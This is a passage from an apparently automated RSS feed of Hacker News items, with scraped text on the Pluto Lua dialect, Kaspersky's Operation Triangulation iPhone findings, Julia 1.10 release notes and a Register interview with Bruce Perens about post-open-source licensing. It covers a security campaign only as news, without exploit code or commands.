        </item>
        <item>
            <title><![CDATA[Pluto, a Modern Lua Dialect (113 pts)]]></title>
            <link>https://pluto-lang.org/</link>
            <guid>38784188</guid>
            <pubDate>Wed, 27 Dec 2023 17:25:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pluto-lang.org/">https://pluto-lang.org/</a>, See on <a href="https://news.ycombinator.com/item?id=38784188">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><p><a href="#__docusaurus_skipToContent_fallback">Skip to main content</a></p></div><nav aria-label="Main"><div><div><a href="https://pluto-lang.org/"><p><img src="https://pluto-lang.org/img/logo.png" alt="Pluto Logo"><img src="https://pluto-lang.org/img/logo.png" alt="Pluto Logo"></p><b>Pluto</b></a><p><a href="https://pluto-lang.org/docs/Introduction">Documentation</a></p></div><div><a href="https://github.com/PlutoLang/Pluto" target="_blank" rel="noopener noreferrer">GitHub</a></div></div></nav><div id="__docusaurus_skipToContent_fallback"><header><div><p>A superset of Lua 5.4 — with unique features, optimizations, and improvements.</p><div><p><a href="https://pluto-lang.org/docs/Introduction">Learn More</a></p></div></div></header><main><div><div><h3>New Syntax</h3><p>Pluto implements various popular syntaxes that are absent in Lua.</p></div><div><h3>Optimizations</h3><p>Pluto is slightly faster than Lua, but in some instances by a pretty large margin.</p></div><div><h3>Larger Standard Library</h3><p>Pluto aims to meet the standard library of Python, and is slowly encroaching this goal.</p></div></div></main></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[4-year campaign backdoored iPhones using possibly most advanced exploit ever (412 pts)]]></title>
            <link>https://arstechnica.com/security/2023/12/exploit-used-in-mass-iphone-infection-campaign-targeted-secret-hardware-feature/</link>
            <guid>38784073</guid>
            <pubDate>Wed, 27 Dec 2023 17:15:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/security/2023/12/exploit-used-in-mass-iphone-infection-campaign-targeted-secret-hardware-feature/">https://arstechnica.com/security/2023/12/exploit-used-in-mass-iphone-infection-campaign-targeted-secret-hardware-feature/</a>, See on <a href="https://news.ycombinator.com/item?id=38784073">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody">
                                    
<figure>
  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/12/omgiphonehax-800x534.jpg" alt="iphone with text background">
      <figcaption></figcaption>  </figure>

  




<!-- cache hit 334:single/related:f3cfa98b90961ddcdffd21654e316ec1 --><!-- empty -->
<p>Researchers on Wednesday presented intriguing new findings surrounding an attack that over four years backdoored dozens if not thousands of iPhones, many of which belonged to employees of Moscow-based security firm Kaspersky. Chief among the discoveries: the unknown attackers were able to achieve an unprecedented level of access by exploiting a vulnerability in an undocumented hardware feature that few if anyone outside of Apple and chip suppliers such as ARM Holdings knew of.</p>
<p>“The exploit's sophistication and the feature's obscurity suggest the attackers had advanced technical capabilities,” Kaspersky researcher Boris Larin wrote in an email. “Our analysis hasn't revealed how they became aware of this feature, but we're exploring all possibilities, including accidental disclosure in past firmware or source code releases. They may also have stumbled upon it through hardware reverse engineering.”</p>
<h2>Four zero-days exploited for years</h2>
<p>Other questions remain unanswered, wrote Larin, even after about 12 months of intensive investigation. Besides how the attackers learned of the hardware feature, the researchers still don’t know what, precisely, its purpose is. Also unknown is if the feature is a native part of the iPhone or enabled by a third-party hardware component such as ARM’s CoreSight</p>
<p>The mass backdooring campaign, which according to Russian officials also infected the iPhones of thousands of people working inside diplomatic missions and embassies in Russia, according to Russian government officials, <a href="https://arstechnica.com/information-technology/2023/06/clickless-ios-exploits-infect-kaspersky-iphones-with-never-before-seen-malware/">came to light in June</a>. Over a span of at least four years, Kaspersky said, the infections were delivered in iMessage texts that installed malware through a complex exploit chain without requiring the receiver to take any action.
</p><p>With that, the devices were infected with full-featured spyware that, among other things, transmitted microphone recordings, photos, geolocation, and other sensitive data to attacker-controlled servers. Although infections didn’t survive a reboot, the unknown attackers kept their campaign alive simply by sending devices a new malicious iMessage text shortly after devices were restarted.</p>
<p>A fresh infusion of details disclosed Wednesday said that “Triangulation”—the name Kaspersky gave to both the malware and the campaign that installed it—exploited four critical zero-day vulnerabilities, meaning serious programming flaws that were known to the attackers before they were known to Apple. The company has since patched all four of the vulnerabilities, which are tracked as:</p>                                            
                                                        
<ul>
<li><a href="https://support.apple.com/en-us/103837">CVE-2023-32434</a></li>
<li><a href="https://support.apple.com/en-us/HT213676">CVE-2023-32435</a></li>
<li><a href="https://support.apple.com/en-us/HT213841">CVE-2023-38606</a></li>
<li><a href="https://support.apple.com/en-us/HT213842">CVE-2023-41990</a></li>
</ul>
<p>Besides affecting iPhones, these critical zero-days and the secret hardware function resided in Macs, iPods, iPads, Apple TVs, and Apple Watches. What’s more, the exploits Kaspersky recovered were intentionally developed to work on those devices as well. Apple has patched those platforms as well.</p>
<p>Detecting infections is extremely challenging, even for people with advanced forensic expertise. For those who want to try, a list of Internet addresses, files, and other indicators of compromise is <a href="https://securelist.com/triangulation-validators-modules/110847/">here</a>.</p>
<h2>Mystery iPhone function proves pivotal to Triangulation’s success</h2>
<p>The most intriguing new detail is the targeting of the heretofore-unknown hardware feature, which proved to be pivotal to the Operation Triangulation campaign. A zero-day in the feature allowed the attackers to bypass advanced <a href="https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/web">hardware-based memory protections</a> designed to safeguard device system integrity even after an attacker gained the ability to tamper with memory of the underlying kernel. On most other platforms, once attackers successfully exploit a kernel vulnerability they have full control of the compromised system.</p>
<p>On Apple devices equipped with these protections, such attackers are still unable to perform key post-exploitation techniques such as injecting malicious code into other processes, or modifying kernel code or sensitive kernel data. This powerful protection was bypassed by exploiting a vulnerability in the secret function. The protection, which has rarely been defeated in exploits found to date, is also present in Apple’s M1 and M2 CPUs.</p>
<p>Kaspersky researchers learned of the secret hardware function only after months of extensive reverse engineering of devices that had been infected with Triangulation. In the course, the researchers' attention was drawn to what are known as hardware registers, which provide memory addresses for CPUs to interact with peripheral components such as USBs, memory controllers, and GPUs. MMIOs, short for Memory-mapped Input/Outputs, allow the CPU to write to the specific hardware register of a specific peripheral device.</p>
<p>The researchers found that several of MMIO addresses the attackers used to bypass the memory protections weren’t identified in any <a href="https://www.nxp.com/docs/en/application-note/AN5125.pdf">device tree documentation</a>, which acts as a reference for engineers creating hardware or software for iPhones. Even after the researchers further scoured source codes, kernel images, and firmware, they were still unable to find any mention of the MMIO addresses.</p>

                                                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Julia 1.10 (179 pts)]]></title>
            <link>https://docs.julialang.org/en/v1/NEWS/</link>
            <guid>38783886</guid>
            <pubDate>Wed, 27 Dec 2023 16:57:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://docs.julialang.org/en/v1/NEWS/">https://docs.julialang.org/en/v1/NEWS/</a>, See on <a href="https://news.ycombinator.com/item?id=38783886">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="documenter-page"><h2 id="New-language-features"><a href="#New-language-features">New language features</a><a id="New-language-features-1"></a><a href="#New-language-features" title="Permalink"></a></h2><ul><li>JuliaSyntax.jl is now used as the default parser, providing better diagnostics and faster parsing. Set environment variable <code>JULIA_USE_FLISP_PARSER</code> to <code>1</code> to switch back to the old parser if necessary (and if you find this necessary, please file an issue) (<a href="https://github.com/JuliaLang/julia/issues/46372">#46372</a>).</li><li><code>⥺</code> (U+297A, <code>\leftarrowsubset</code>) and <code>⥷</code> (U+2977, <code>\leftarrowless</code>) may now be used as binary operators with arrow precedence (<a href="https://github.com/JuliaLang/julia/issues/45962">#45962</a>).</li></ul><h2 id="Language-changes"><a href="#Language-changes">Language changes</a><a id="Language-changes-1"></a><a href="#Language-changes" title="Permalink"></a></h2><ul><li>When a task forks a child, the parent task's task-local RNG (random number generator) is no longer affected. The seeding of child based on the parent task also takes a more disciplined approach to collision resistance, using a design based on the SplitMix and DotMix splittable RNG schemes (<a href="https://github.com/JuliaLang/julia/issues/49110">#49110</a>).</li><li>A new more-specific rule for methods resolves ambiguities containing Union{} in favor of the method defined explicitly to handle the Union{} argument. This makes it possible to define methods to explicitly handle Union{} without the ambiguities that commonly would result previously. This also lets the runtime optimize certain method lookups in a way that significantly improves load and inference times for heavily overloaded methods that dispatch on Types (such as traits and constructors).</li><li>The "h bar" <code>ℏ</code> (<code>\hslash</code> U+210F) character is now treated as equivalent to <code>ħ</code> (<code>\hbar</code> U+0127).</li><li>The <code>@simd</code> macro now has more limited and clearer semantics: it only enables reordering and contraction of floating-point operations, instead of turning on all "fastmath" optimizations. If you observe performance regressions due to this change, you can recover previous behavior with <code>@fastmath @simd</code>, if you are OK with all the optimizations enabled by the <code>@fastmath</code> macro (<a href="https://github.com/JuliaLang/julia/issues/49405">#49405</a>).</li><li>When a method with keyword arguments is displayed in the stack trace view, the textual representation of the keyword arguments' type is simplified using the new <code>@Kwargs{key1::Type1, ...}</code> macro syntax (<a href="https://github.com/JuliaLang/julia/issues/49959">#49959</a>).</li></ul><h2 id="Compiler/Runtime-improvements"><a href="#Compiler/Runtime-improvements">Compiler/Runtime improvements</a><a id="Compiler/Runtime-improvements-1"></a><a href="#Compiler/Runtime-improvements" title="Permalink"></a></h2><ul><li>The mark phase of the garbage collector is now multi-threaded (<a href="https://github.com/JuliaLang/julia/issues/48600">#48600</a>).</li><li><a href="https://llvm.org/docs/JITLink.html">JITLink</a> is enabled by default on Linux aarch64 when Julia is linked to LLVM 15 or later versions (<a href="https://github.com/JuliaLang/julia/issues/49745">#49745</a>). This should resolve many segmentation faults previously observed on this platform.</li><li>The precompilation process now uses pidfile locks and orchestrates multiple julia processes to only have one process spend effort precompiling while the others wait. Previously all would do the work and race to overwrite the cache files. (<a href="https://github.com/JuliaLang/julia/issues/49052">#49052</a>)</li></ul><h2 id="Command-line-option-changes"><a href="#Command-line-option-changes">Command-line option changes</a><a id="Command-line-option-changes-1"></a><a href="#Command-line-option-changes" title="Permalink"></a></h2><ul><li>New option <code>--gcthreads</code> to set how many threads will be used by the garbage collector (<a href="https://github.com/JuliaLang/julia/issues/48600">#48600</a>). The default is <code>N/2</code> where <code>N</code> is the number of worker threads (<code>--threads</code>) used by Julia.</li></ul><h2 id="Build-system-changes"><a href="#Build-system-changes">Build system changes</a><a id="Build-system-changes-1"></a><a href="#Build-system-changes" title="Permalink"></a></h2><ul><li>SparseArrays and SuiteSparse are no longer included in the default system image, so the core language no longer contains GPL libraries. However, these libraries are still included alongside the language in the standard binary distribution (<a href="https://github.com/JuliaLang/julia/issues/44247">#44247</a>, <a href="https://github.com/JuliaLang/julia/issues/48979">#48979</a>, <a href="https://github.com/JuliaLang/julia/issues/49266">#49266</a>).</li></ul><h2 id="New-library-functions"><a href="#New-library-functions">New library functions</a><a id="New-library-functions-1"></a><a href="#New-library-functions" title="Permalink"></a></h2><ul><li><code>tanpi</code> is now defined. It computes tan(π<em>x) more accurately than `tan(pi</em>x)` (<a href="https://github.com/JuliaLang/julia/issues/48575">#48575</a>).</li><li><code>fourthroot(x)</code> is now defined in <code>Base.Math</code> and can be used to compute the fourth root of <code>x</code>.  It can also be accessed using the unicode character <code>∜</code>, which can be typed by <code>\fourthroot&lt;tab&gt;</code> (<a href="https://github.com/JuliaLang/julia/issues/48899">#48899</a>).</li><li><code>Libc.memmove</code>, <code>Libc.memset</code>, and <code>Libc.memcpy</code> are now defined, whose functionality matches that of their respective C calls.</li><li><code>Base.isprecompiled(pkg::PkgId)</code> has been added, to identify whether a package has already been precompiled (<a href="https://github.com/JuliaLang/julia/issues/50218">#50218</a>).</li></ul><h2 id="New-library-features"><a href="#New-library-features">New library features</a><a id="New-library-features-1"></a><a href="#New-library-features" title="Permalink"></a></h2><ul><li><code>binomial(x, k)</code> now supports non-integer <code>x</code> (<a href="https://github.com/JuliaLang/julia/issues/48124">#48124</a>).</li><li>A <code>CartesianIndex</code> is now treated as a "scalar" for broadcasting (<a href="https://github.com/JuliaLang/julia/issues/47044">#47044</a>).</li><li><code>printstyled</code> now supports italic output (<a href="https://github.com/JuliaLang/julia/issues/45164">#45164</a>).</li><li><code>parent</code> and <code>parentindices</code> support <code>SubString</code>s.</li><li><code>replace(string, pattern...)</code> now supports an optional <code>IO</code> argument to write the output to a stream rather than returning a string (<a href="https://github.com/JuliaLang/julia/issues/48625">#48625</a>).</li><li><code>startswith</code> now supports seekable <code>IO</code> streams (<a href="https://github.com/JuliaLang/julia/issues/43055">#43055</a>).</li></ul><h2 id="Standard-library-changes"><a href="#Standard-library-changes">Standard library changes</a><a id="Standard-library-changes-1"></a><a href="#Standard-library-changes" title="Permalink"></a></h2><ul><li>The <code>initialized=true</code> keyword assignment for <code>sortperm!</code> and <code>partialsortperm!</code> is now a no-op (<a href="https://github.com/JuliaLang/julia/issues/47979">#47979</a>). It previously exposed unsafe behavior (<a href="https://github.com/JuliaLang/julia/issues/47977">#47977</a>).</li><li>Printing integral <code>Rational</code>s will skip the denominator in <code>Rational</code>-typed IO context (e.g. in arrays) (<a href="https://github.com/JuliaLang/julia/issues/45396">#45396</a>).</li></ul><h4 id="Package-Manager"><a href="#Package-Manager">Package Manager</a><a id="Package-Manager-1"></a><a href="#Package-Manager" title="Permalink"></a></h4><ul><li><code>Pkg.precompile</code> now accepts <code>timing</code> as a keyword argument which displays per package timing information for precompilation (e.g. <code>Pkg.precompile(timing=true)</code>).</li></ul><h4 id="LinearAlgebra"><a href="#LinearAlgebra">LinearAlgebra</a><a id="LinearAlgebra-1"></a><a href="#LinearAlgebra" title="Permalink"></a></h4><ul><li><code>AbstractQ</code> no longer subtypes <code>AbstractMatrix</code>. Moreover, <code>adjoint(Q::AbstractQ)</code> no longer wraps <code>Q</code> in an <code>Adjoint</code> type, but instead in an <code>AdjointQ</code>, that itself subtypes <code>AbstractQ</code>. This change accounts for the fact that typically <code>AbstractQ</code> instances behave like function-based, matrix-backed linear operators, and hence don't allow for efficient indexing. Also, many <code>AbstractQ</code> types can act on vectors/matrices of different size, acting like a matrix with context-dependent size. With this change, <code>AbstractQ</code> has a well-defined API that is described in detail in the <a href="https://docs.julialang.org/en/v1/stdlib/LinearAlgebra/#man-linalg-abstractq">Julia documentation</a> (<a href="https://github.com/JuliaLang/julia/issues/46196">#46196</a>).</li><li>Adjoints and transposes of <code>Factorization</code> objects are no longer wrapped in <code>Adjoint</code> and <code>Transpose</code> wrappers, respectively. Instead, they are wrapped in <code>AdjointFactorization</code> and <code>TranposeFactorization</code> types, which themselves subtype <code>Factorization</code> (<a href="https://github.com/JuliaLang/julia/issues/46874">#46874</a>).</li><li>New functions <code>hermitianpart</code> and <code>hermitianpart!</code> for extracting the Hermitian (real symmetric) part of a matrix (<a href="https://github.com/JuliaLang/julia/issues/31836">#31836</a>).</li><li>The <code>norm</code> of the adjoint or transpose of an <code>AbstractMatrix</code> now returns the norm of the parent matrix by default, matching the current behaviour for <code>AbstractVector</code>s (<a href="https://github.com/JuliaLang/julia/issues/49020">#49020</a>).</li><li><code>eigen(A, B)</code> and <code>eigvals(A, B)</code>, where one of <code>A</code> or <code>B</code> is symmetric or Hermitian, are now fully supported (<a href="https://github.com/JuliaLang/julia/issues/49533">#49533</a>).</li><li><code>eigvals/eigen(A, cholesky(B))</code> now computes the generalized eigenvalues (<code>eigen</code>: and eigenvectors) of <code>A</code> and <code>B</code> via Cholesky decomposition for positive definite <code>B</code>. Note: The second argument is the output of <code>cholesky</code>.</li></ul><h4 id="Printf"><a href="#Printf">Printf</a><a id="Printf-1"></a><a href="#Printf" title="Permalink"></a></h4><ul><li>Format specifiers now support dynamic width and precision, e.g. <code>%*s</code> and <code>%*.*g</code> (<a href="https://github.com/JuliaLang/julia/issues/40105">#40105</a>).</li></ul><h4 id="REPL"><a href="#REPL">REPL</a><a id="REPL-1"></a><a href="#REPL" title="Permalink"></a></h4><ul><li>When stack traces are printed, the printed depth of types in function signatures will be limited to avoid overly verbose output (<a href="https://github.com/JuliaLang/julia/issues/49795">#49795</a>).</li></ul><h4 id="Test"><a href="#Test">Test</a><a id="Test-1"></a><a href="#Test" title="Permalink"></a></h4><ul><li>The <code>@test_broken</code> macro (or <code>@test</code> with <code>broken=true</code>) now complains if the test expression returns a non-boolean value in the same way as a non-broken test (<a href="https://github.com/JuliaLang/julia/issues/47804">#47804</a>).</li><li>When a call to <code>@test</code> fails or errors inside a function, a larger stacktrace is now printed such that the location of the  test within a <code>@testset</code> can be retrieved (<a href="https://github.com/JuliaLang/julia/issues/49451">#49451</a>).</li></ul><h4 id="InteractiveUtils"><a href="#InteractiveUtils">InteractiveUtils</a><a id="InteractiveUtils-1"></a><a href="#InteractiveUtils" title="Permalink"></a></h4><ul><li><code>code_native</code> and <code>@code_native</code> now default to intel syntax instead of AT&amp;T.</li><li><code>@time_imports</code> now shows the timing of any module <code>__init__()</code>s that are run (<a href="https://github.com/JuliaLang/julia/issues/49529">#49529</a>).</li></ul><h2 id="Deprecated-or-removed"><a href="#Deprecated-or-removed">Deprecated or removed</a><a id="Deprecated-or-removed-1"></a><a href="#Deprecated-or-removed" title="Permalink"></a></h2><ul><li>The <code>@pure</code> macro is now deprecated. Use <code>Base.@assume_effects :foldable</code> instead (<a href="https://github.com/JuliaLang/julia/issues/48682">#48682</a>).</li></ul></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Apple wins bid to pause Apple Watch ban at US appeals court (115 pts)]]></title>
            <link>https://www.reuters.com/legal/apple-wins-bid-pause-apple-watch-ban-us-appeals-court-2023-12-27/</link>
            <guid>38783718</guid>
            <pubDate>Wed, 27 Dec 2023 16:43:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.reuters.com/legal/apple-wins-bid-pause-apple-watch-ban-us-appeals-court-2023-12-27/">https://www.reuters.com/legal/apple-wins-bid-pause-apple-watch-ban-us-appeals-court-2023-12-27/</a>, See on <a href="https://news.ycombinator.com/item?id=38783718">Hacker News</a></p>
Couldn't get https://www.reuters.com/legal/apple-wins-bid-pause-apple-watch-ban-us-appeals-court-2023-12-27/: Error: Request failed with status code 401]]></description>
        </item>
        <item>
            <title><![CDATA[What comes after open source? Bruce Perens is working on it (121 pts)]]></title>
            <link>https://www.theregister.com/2023/12/27/bruce_perens_post_open/</link>
            <guid>38783500</guid>
            <pubDate>Wed, 27 Dec 2023 16:25:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theregister.com/2023/12/27/bruce_perens_post_open/">https://www.theregister.com/2023/12/27/bruce_perens_post_open/</a>, See on <a href="https://news.ycombinator.com/item?id=38783500">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body">
<p><span>Interview</span> Bruce Perens, one of the founders of the Open Source movement, is ready for what comes next: the Post-Open Source movement.</p>
<p>"I've written papers about it, and I've tried to put together a prototype license," Perens explains in an interview with <em>The Register</em>. "Obviously, I need help from a lawyer. And then the next step is to go for grant money."</p>
<p>Perens says there are several pressing problems that the open source community needs to address.</p>
<blockquote>

<p>I feel that IBM has gotten everything it wants from the open source developer community now, and we've received something of a middle finger from them...</p>
</blockquote>
<p>"First of all, our licenses aren't working anymore," he said. "We've had enough time that businesses have found all of the loopholes and thus we need to do something new. The GPL is not acting the way the GPL should have done when one-third of all paid-for Linux systems are sold with a GPL circumvention. That's RHEL."</p>
<p>RHEL stands for Red Hat Enterprise Linux, which in June, under IBM's ownership, <a target="_blank" href="https://www.theregister.com/2023/06/23/red_hat_centos_move/">stopped making its source code available</a> as required under the GPL.</p>

    

<p>Perens recently returned from a trip to China, where he was the keynote speaker at the Bench 2023 conference. In anticipation of his conversation with <em>El Reg</em>, he wrote up some thoughts on his visit and on the state of the open source software community.</p>

        


        

<p>One of the matters that came to mind was Red Hat.</p>
<div><p><img src="https://regmedia.co.uk/2023/06/23/ibmredhat.jpg?x=174&amp;amp;y=115&amp;amp;crop=1" width="174" height="115" alt="IBMredhat"></p><h2 title="From now on, only CentOS Stream's source code is available to all">Red Hat strikes a crushing blow against RHEL downstreams</h2>
<p><a href="https://www.theregister.com/2023/06/23/red_hat_centos_move/"><span>READ MORE</span></a></p></div>
<p>"They aren't really Red Hat any longer, they're IBM," Perens writes in the note he shared with <em>The Register</em>. "And of course they stopped distributing CentOS, and for a long time they've done something that I feel violates the GPL, and <a target="_blank" href="https://www.theregister.com/2020/03/27/grsecurity_bruce_perens_gpl_settlement/">my defamation case</a> was about another company doing the exact same thing: They tell you that if you are a RHEL customer, you can't disclose the GPL source for security patches that RHEL makes, because they won't allow you to be a customer any longer. IBM employees assert that they are still feeding patches to the upstream open source project, but of course they aren't required to do so.</p>
<p>"This has gone on for a long time, and only the fact that Red Hat made a public distribution of CentOS (essentially an unbranded version of RHEL) made it tolerable. Now IBM isn't doing that any longer. So I feel that IBM has gotten everything it wants from the open source developer community now, and we've received something of a middle finger from them.</p>
<p>"Obviously CentOS was important to companies as well, and they are running for the wings in adopting Rocky Linux. I could wish they went to a Debian derivative, but OK. But we have a number of straws on the Open Source camel's back. Will one break it?"</p>

        

<p>Another straw burdening the Open Source camel, Perens writes, "is that Open Source has completely failed to serve the common person. For the most part, if they use us at all they do so through a proprietary software company's systems, like Apple iOS or Google Android, both of which use Open Source for infrastructure but the apps are mostly proprietary. The common person doesn't know about Open Source, they don't know about the freedoms we promote which are increasingly in their interest. Indeed, Open Source is used today to surveil and even oppress them."</p>
<p>Free Software, Perens explains, is now 50 years old and the first announcement of Open Source occurred 30 years ago. "Isn't it time for us to take a look at what we've been doing, and see if we can do better? Well, yes, but we need to preserve Open Source at the same time. Open Source will continue to exist and provide the same rules and paradigm, and the thing that comes after Open Source should be called something else and should never try to pass itself off as Open Source. So far, I call it Post-Open."</p>
<p>Post-Open, as he describes it, is a bit more involved than Open Source. It would define the corporate relationship with developers to ensure companies paid a fair amount for the benefits they receive. It would remain free for individuals and non-profit, and would entail just one license.</p>

        

<p>He imagines a simple yearly compliance process that gets companies all the rights they need to use Post-Open software. And they'd fund developers who would be encouraged to write software that's usable by the common person, as opposed to technical experts.</p>
<p>Pointing to popular applications from Apple, Google, and Microsoft, Perens says: "A lot of the software is oriented toward the customer being the product – they're certainly surveilled a great deal, and in some cases are actually abused. So it's a good time for open source to actually do stuff for normal people."</p>
<p>The reason that doesn't often happen today, says Perens, is that open source developers tend to write code for themselves and those who are similarly adept with technology. The way to avoid that, he argues, is to pay developers, so they have support to take the time to make user-friendly applications.</p>
<p>Companies, he suggests, would foot the bill, which could be apportioned to contributing developers using the sort of software that instruments GitHub and shows who contributes what to which products. <a target="_blank" rel="nofollow" href="https://www.merico.dev/">Merico</a>, he says, is a company that provides such software.</p>
<p>Perens acknowledges that a lot of stumbling blocks need to be overcome, like finding an acceptable entity to handle the measurements and distribution of funds. What's more, the financial arrangements have to appeal to enough developers.</p>
<p>"And all of this has to be transparent and adjustable enough that it doesn't fork 100 different ways," he muses. "So, you know, that's one of my big questions. Can this really happen?"</p>
<ul>

<li><a href="https://www.theregister.com/2023/09/20/gnu_turns_40/">GNU turns 40: Stallman's baby still not ready for prime time, but hey, there's cake</a></li>

<li><a href="https://www.theregister.com/2023/07/10/oracle_ibm_rhel_code/">Oracle pours fuel all over Red Hat source code drama</a></li>

<li><a href="https://www.theregister.com/2023/04/17/rust_foundation_apologizes_trademark_policy/">Rust Foundation so sorry for scaring the C out of you with trademark crackdown talk</a></li>

<li><a href="https://www.theregister.com/2022/11/16/sourceware_open_source_openssf/">Open source community split over offer of 'corporate' welfare for critical dev tools</a></li>
</ul>
<p>Whether it can or not, Perens argues that the GPL isn't enough. "The GPL is designed not as a contract but as a license. What Richard Stallman was thinking was he didn't want to take away anyone's rights. He only wanted to grant rights. So it's not a contract. It's a license. Well, we can't do that anymore. We need enforceable contract terms."</p>
<p>Asked whether the adoption of non-Open Source licenses, by the likes of <a target="_blank" href="https://www.theregister.com/2023/08/11/hashicorp_bsl_licence/">HashiCorp</a>, <a target="_blank" href="https://www.theregister.com/2021/01/18/elastics_doubling_down_on_open/">Elastic</a>, <a target="_blank" href="https://www.theregister.com/2022/03/17/court_open_source/">Neo4j</a>, and <a target="_blank" href="https://www.theregister.com/2018/10/16/mongodb_licensning_change/">MongoDB</a>, represent a viable way forward, Perens says new thinking is needed.</p>
<p>He's not a fan of licenses like the Commons Clause, which is at the center of <a target="_blank" href="https://www.theregister.com/2023/02/12/software_freedom_conservancy_fights_agplv3/">a legal battle involving Neo4j</a>.</p>
<p>"Why is the Commons Clause bad?" he writes. "First, there's the Brand Problem. Open Source licenses have a 'brand' which is the understanding of the rights they convey, and of course Open Source has a brand too, which is the understanding of the rights in the Open Source Definition. The Commons Clause appears to use the Open Source license, but doesn't give the same rights at all, thus abusing the license brand for profit.</p>
<p>"The other problem is that the Commons Clause is added to licenses that don't actually allow terms to be added, like the AGPL 3 on Neo4J. AGPL and GPL have two paragraphs that both disallow the addition of terms. So, when a licensor adds the Commons Clause, they create a license with self-contradictory legal language."</p>
<p>"We've been working on the [software-as-a-service] problem for quite a long time," Perens tells <em>The Register</em>. "I remember attending a [Free Software Foundation] meeting, where the question was, 'what do we do about Google?' And the AGPL came out of that meeting."</p>
<p>Perens doesn't think the AGPL or various non-Open Source licenses focus on the right issue in the context of cloud companies.</p>
<blockquote>

<p>I think that AI is always plagiarism... When you train the model, you're training the model with other people's copyrighted stuff...</p>
</blockquote>
<p>"So AGPL, for example, makes software disclose its own source code in some way," he says. "What we're actually talking about is public performance in software, and public performance is a separate right under copyright, because it was necessary for plays and films. So we have that right under copyright and we can use it. I think those licenses are all sort of trying to reach a goal and are getting partially there because they only tried to make slight changes from open source. And, you know, it's 30 years that we've had open source. We can consider a radical departure."</p>
<p>Asked about the current enthusiasm for the tech which the industry refers to as "AI," Perens expresses disapproval.</p>
<p>"I think that AI is always plagiarism," he says. "When you train the model, you're training the model with other people's copyrighted stuff. And what the AI does is mix and match and output a combination of what was input. We have to consider that. How do we compensate the people whose data was used to train the model? Should we be training it with open source software? I don't think so. But it does more than that. It reads people's websites. It reads the whole of Wikipedia. Nobody on the input side is being compensated fairly for the output. So that's a big question we have to resolve."</p>
<p>As to whether US efforts to withhold technology from China are working, Perens said they have been largely ineffective.</p>
<p>"The Chinese can do, with one or two exceptions that will fall soon enough, everything that we do," he says, noting that while they're behind on advanced chips, they'll catch up. He says he came away from his trip surprised by how similar the people in the US and China are, both in terms of the way people live their lives and in their disinterest in the geopolitical posturing in the South China Sea that adds tension to the US-China relationship.</p>
<p>Maintaining some degree of civility with China also has implications for the open source community due to US export laws, specifically, ITAR, the International Traffic in Arms Restrictions, administered by the Department of State, and EAR, the Export Administration Regulations, overseen by the Department of Commerce.</p>
<p>"Now, space satellites and digital voice CODECs, and some uses of Kraken RF project, and probably hundreds of other Open Source projects, are still on the list of restricted technologies," Perens explains. "As a result of several lawsuits, both ITAR and EAR got carve-outs for 'information in the public domain.' This doesn't mean 'public-domain software,' which is a matter of copyright. It means 'not trade-secret.' So it applies to Open Source and published research.</p>
<p>"Today, a project that is <em>completely</em> disclosed can be operated without restriction under ITAR and EAR. Open Research Institute, a while ago, did the work to get such a project explicitly approved by the Department of State and Department of Commerce. So it's currently possible to run an Open Source project for what might otherwise be a 'munitions' technology, including with nations that would otherwise be restricted under ITAR and EAR. This is something important for us to protect, both for Open Source and for public research. It is always under threat as US politicians are increasingly concerned with such things as 3D-printed guns and many of them want to be more restrictive of technology sharing with China, etc."</p>
<p>"I think that it's very scary that potentially we have strife with this country," says Perens. "But if you look at the people, the people are so much like us today. We really should be having peace together." ®</p>                                
                    </div></div>]]></description>
        </item>
    </channel>
</rss>